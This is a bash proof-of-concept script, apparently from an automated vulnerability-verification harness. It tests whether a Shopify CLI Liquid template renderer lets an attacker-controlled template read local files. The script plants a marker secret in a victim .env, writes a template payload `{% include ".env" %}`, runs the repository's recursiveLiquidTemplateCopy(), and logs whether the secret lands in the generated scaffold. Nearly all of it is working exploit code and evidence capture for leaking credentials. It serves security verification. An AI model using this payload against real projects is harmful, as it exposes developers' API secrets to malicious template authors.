#!/usr/bin/env bash
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../../.." && pwd)"
EVIDENCE_DIR="$SCRIPT_DIR/evidence"
WORK_DIR="$EVIDENCE_DIR/work"
EXPLOIT_LOG="$EVIDENCE_DIR/exploit.log"
IMPACT_LOG="$EVIDENCE_DIR/impact.log"
HEALTHCHECK_LOG="$EVIDENCE_DIR/healthcheck.log"
SETUP_LOG="$EVIDENCE_DIR/setup.log"
ENV_INFO="$EVIDENCE_DIR/env-info.txt"

mkdir -p "$EVIDENCE_DIR"
: > "$EXPLOIT_LOG"
: > "$IMPACT_LOG"
: > "$HEALTHCHECK_LOG"
: > "$SETUP_LOG"

log() {
  printf '%s\n' "$*" | tee -a "$EXPLOIT_LOG"
}

finish() {
  local status="$1"
  local evidence="$2"
  local notes="${3:-}"
  local line
  line="$(node -e 'console.log(JSON.stringify({status: process.argv[1], evidence: process.argv[2], notes: process.argv[3] || ""}))' "$status" "$evidence" "$notes" 2>/dev/null || printf '{"status":"%s","evidence":"%s","notes":"%s"}' "$status" "$evidence" "$notes")"
  printf '%s\n' "$line" | tee -a "$EXPLOIT_LOG"
  exit 0
}

{
  echo "repo_root=$REPO_ROOT"
  echo "node=$(node -v 2>/dev/null || echo missing)"
  echo "pnpm=$(pnpm -v 2>/dev/null || echo missing)"
  echo "uname=$(uname -a 2>/dev/null || echo unknown)"
  echo "git_commit=$(git -C "$REPO_ROOT" rev-parse --short HEAD 2>/dev/null || echo unknown)"
} > "$ENV_INFO"

VITE_NODE="$REPO_ROOT/node_modules/.bin/vite-node"
if [[ ! -x "$VITE_NODE" ]]; then
  echo "vite-node not found at $VITE_NODE; run pnpm install from repo root" > "$SETUP_LOG"
  finish "inconclusive" "vite-node unavailable" "repository dependencies are not installed"
fi

if [[ ! -f "$REPO_ROOT/packages/cli-kit/src/public/node/liquid.ts" ]]; then
  echo "missing vulnerable source file" > "$SETUP_LOG"
  finish "failed" "vulnerable source file missing" "packages/cli-kit/src/public/node/liquid.ts not found"
fi

rm -rf "$WORK_DIR"
mkdir -p "$WORK_DIR/victim-cwd" "$WORK_DIR/malicious-template" "$WORK_DIR/generated-app"

MARKER="PIOLIUM_LIQUID_SECRET_$(date +%s)_$$"
printf 'SHOPIFY_API_SECRET=%s\n' "$MARKER" > "$WORK_DIR/victim-cwd/.env"
printf '{%% include ".env" %%}\n' > "$WORK_DIR/malicious-template/leaked-env.txt.liquid"

cat > "$WORK_DIR/run-liquid-copy.ts" <<'TS'
const [templateDir, outputDir, moduleUrl] = process.argv.slice(2)
const {recursiveLiquidTemplateCopy} = await import(moduleUrl)
await recursiveLiquidTemplateCopy(templateDir, outputDir, {
  app_name: 'poc-app',
  dependency_manager: 'npm',
})
TS

MODULE_URL="$(node -e 'const {pathToFileURL} = require("url"); console.log(pathToFileURL(process.argv[1]).href)' "$REPO_ROOT/packages/cli-kit/src/public/node/liquid.ts")"

{
  echo "Using actual app-init render path and vulnerable renderer:"
  grep -n "recursiveLiquidTemplateCopy" "$REPO_ROOT/packages/app/src/cli/services/init/init.ts" || true
  grep -n "new Liquid" "$REPO_ROOT/packages/cli-kit/src/public/node/liquid.ts" || true
  echo "vite_node=$VITE_NODE"
  echo "victim_cwd=$WORK_DIR/victim-cwd"
  echo "template=$WORK_DIR/malicious-template/leaked-env.txt.liquid"
} > "$HEALTHCHECK_LOG"

cat > "$SETUP_LOG" <<EOF
Created victim CWD with .env and attacker-controlled downloaded template tree.
The exploit runs recursiveLiquidTemplateCopy() from the repository source while the process CWD is the victim directory.
EOF

log "[*] Victim CWD contains .env marker: $MARKER"
log "[*] Malicious template payload: {% include \".env\" %}"
log "[*] Invoking actual recursiveLiquidTemplateCopy() from cli-kit with victim CWD..."

(
  cd "$WORK_DIR/victim-cwd" && "$VITE_NODE" "$WORK_DIR/run-liquid-copy.ts" "$WORK_DIR/malicious-template" "$WORK_DIR/generated-app" "$MODULE_URL"
) >> "$EXPLOIT_LOG" 2>&1
RC=$?

OUTPUT_FILE="$WORK_DIR/generated-app/leaked-env.txt"
if [[ $RC -ne 0 ]]; then
  log "[!] Renderer exited with code $RC"
  finish "failed" "renderer failed before output" "see evidence/exploit.log"
fi

if [[ -f "$OUTPUT_FILE" ]] && grep -q "$MARKER" "$OUTPUT_FILE"; then
  {
    echo "Generated scaffold file: $OUTPUT_FILE"
    echo "Leaked marker observed in generated scaffold: $MARKER"
    echo "--- generated file ---"
    cat "$OUTPUT_FILE"
  } > "$IMPACT_LOG"
  log "[+] Generated scaffold file contains victim .env contents: $OUTPUT_FILE"
  log "[+] Security impact captured in evidence/impact.log"
  finish "confirmed" "victim .env marker copied into generated scaffold" "actual recursiveLiquidTemplateCopy() rendered attacker include from process CWD"
else
  {
    echo "Expected marker was not found."
    echo "output_file=$OUTPUT_FILE"
    [[ -f "$OUTPUT_FILE" ]] && cat "$OUTPUT_FILE"
  } > "$IMPACT_LOG"
  finish "failed" "generated scaffold lacks victim .env marker" "see evidence/impact.log"
fi
